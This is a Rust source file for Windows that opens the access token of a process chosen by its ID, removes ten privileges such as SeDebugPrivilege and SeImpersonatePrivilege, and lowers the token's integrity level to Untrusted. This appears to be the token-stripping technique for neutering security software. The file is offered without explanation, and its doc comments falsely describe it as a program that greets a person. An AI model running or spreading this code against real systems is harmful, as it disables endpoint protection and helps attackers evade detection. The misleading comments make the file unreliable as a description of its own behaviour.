use windows::Win32::System::Threading::{OpenProcess, OpenProcessToken, PROCESS_QUERY_LIMITED_INFORMATION};
use windows::Win32::Security::*;
use windows::Win32::Foundation::{LUID, PSID, HANDLE, PSTR};
use windows::Win32::System::SystemServices::*;
use core::ptr::null_mut;
use core::mem::size_of;
use clap::Parser;


const CAPABILITIES: [PSTR;10] = [
    PSTR(b"SeDebugPrivilege\0" as *const _),
    PSTR(b"SeImpersonatePrivilege\0" as *const _),
    PSTR(b"SeTcbPrivilege\0" as *const _),
    PSTR(b"SeIncreaseBasePriorityPrivilege\0" as *const _),
    PSTR(b"SeChangeNotifyPrivilege\0" as *const _),
    PSTR(b"SeRestorePrivilege\0" as *const _),
    PSTR(b"SeBackupPrivilege\0" as *const _),
    PSTR(b"SeSecurityPrivilege\0" as *const _),
    PSTR(b"SeAssignPrimaryTokenPrivilege\0" as *const _),
    PSTR(b"SeIncreaseWorkingSetPrivilege\0" as *const _)
];
/// Simple program to greet a person
#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    /// Name of the person to greet
    #[clap(short, long)]
    pid: u32,
}


fn main() {
    let args = Args::parse();


    let phandle = unsafe{OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, args.pid)};
    if phandle.is_invalid(){
        println!("Error opening Process {0}", args.pid);
    }

    let mut token_handle = HANDLE::default();
    let token_open = unsafe{OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &mut token_handle)};
    if token_open == false {
        println!("Insufficient Permissions. SYSTEM permissions may be required.");
        return;
    }

    for cap in CAPABILITIES.iter(){
        let privs = LUID_AND_ATTRIBUTES {Luid: LUID { LowPart: 0, HighPart: 0,},Attributes: SE_PRIVILEGE_REMOVED,};
        let mut tp = TOKEN_PRIVILEGES {PrivilegeCount: 1,Privileges: [privs ;1],};

        let _ = unsafe{LookupPrivilegeValueA(PSTR(null_mut() as _),cap,&mut tp.Privileges[0].Luid,)};
        let _ = unsafe{AdjustTokenPrivileges(token_handle,false,&mut tp,size_of::<TOKEN_PRIVILEGES>() as _,null_mut(),null_mut())};
    }

    let mut sid_integrity = SID::default();
    sid_integrity.Revision = SID_REVISION as u8;
    sid_integrity.SubAuthorityCount = 1;
    sid_integrity.IdentifierAuthority.Value[5] = 16;
    sid_integrity.SubAuthority[0] = SECURITY_MANDATORY_UNTRUSTED_RID as u32;

    let mut token_mandatory = TOKEN_MANDATORY_LABEL::default();
    token_mandatory.Label.Attributes = SE_GROUP_INTEGRITY as u32;
    token_mandatory.Label.Sid = PSID(&sid_integrity as *const _ as isize);

    let _token = unsafe{SetTokenInformation(token_handle,
        TokenIntegrityLevel,
        &mut token_mandatory as *mut _ as *mut _,
        core::mem::size_of::<TOKEN_MANDATORY_LABEL>() as u32 + 230
    )};
}
